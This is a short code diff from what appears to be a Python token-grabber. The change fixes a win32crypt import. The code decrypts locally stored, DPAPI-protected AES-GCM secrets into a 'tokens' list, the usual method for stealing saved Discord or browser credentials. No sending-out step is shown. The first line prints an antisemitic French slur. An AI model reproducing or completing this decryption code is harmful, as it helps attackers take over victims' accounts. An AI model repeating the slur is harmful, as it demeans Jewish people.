@@ -1,6 +1,6 @@
 print("debut de la juiferie")
 from base64 import b64decode
-from pywin32 import win32crypt.CryptUnprotectData as CryptUnprotectData
+from pywin32 import win32crypt
 from Crypto.Cipher import AES
 from os import getenv, listdir
 from json import loads, dumps
@@ -15,7 +15,7 @@ tokens, cleaned, checker = [], [], []
 
 def decrypt(buff, master_key):
     try:
-        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
     except Exception:
         return "Error"
 
